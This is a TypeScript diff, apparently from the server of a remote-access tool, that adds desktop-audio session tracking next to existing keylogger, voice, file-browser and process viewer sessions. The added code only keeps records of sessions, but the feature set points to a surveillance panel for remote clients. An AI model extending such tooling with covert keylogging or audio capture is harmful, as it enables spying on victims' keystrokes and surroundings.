@@ -5,6 +5,7 @@ import type {
   FileBrowserViewer,
   ProcessViewer,
   VoiceViewer,
+  DesktopAudioViewer,
   NotificationsViewer,
   KeyloggerViewer,
   ChatViewer,
@@ -36,6 +37,8 @@ const keyloggerSessions = new Map<string, KeyloggerViewer>();
 const keyloggerSessionsByClient = new Map<string, Set<string>>();
 const voiceSessions = new Map<string, VoiceViewer>();
 const voiceSessionsByClient = new Map<string, Set<string>>();
+const desktopAudioSessions = new Map<string, DesktopAudioViewer>();
+const desktopAudioSessionsByClient = new Map<string, Set<string>>();
 const dashboardSessions = new Map<string, DashboardViewer>();
 const chatSessions = new Map<string, ChatViewer>();
 
@@ -438,6 +441,34 @@ export function getVoiceSessionsByClient(clientId: string): VoiceViewer[] {
 
 export function getAllVoiceSessions(): Map<string, VoiceViewer> {
   return voiceSessions;
+}
+
+export function addDesktopAudioSession(session: DesktopAudioViewer): void {
+  desktopAudioSessions.set(session.id, session);
+  addSessionToClientIndex(desktopAudioSessionsByClient, session.clientId, session.id);
+}
+
+export function deleteDesktopAudioSession(sessionId: string): boolean {
+  const existing = desktopAudioSessions.get(sessionId);
+  if (!existing) return false;
+  desktopAudioSessions.delete(sessionId);
+  removeSessionFromClientIndex(desktopAudioSessionsByClient, existing.clientId, sessionId);
+  return true;
+}
+
+export function getDesktopAudioSessionsByClient(clientId: string): DesktopAudioViewer[] {
+  const ids = desktopAudioSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: DesktopAudioViewer[] = [];
+  for (const id of ids) {
+    const session = desktopAudioSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
+}
+
+export function getAllDesktopAudioSessions(): Map<string, DesktopAudioViewer> {
+  return desktopAudioSessions;
 }
 
 export function addDashboardSession(session: DashboardViewer): void {
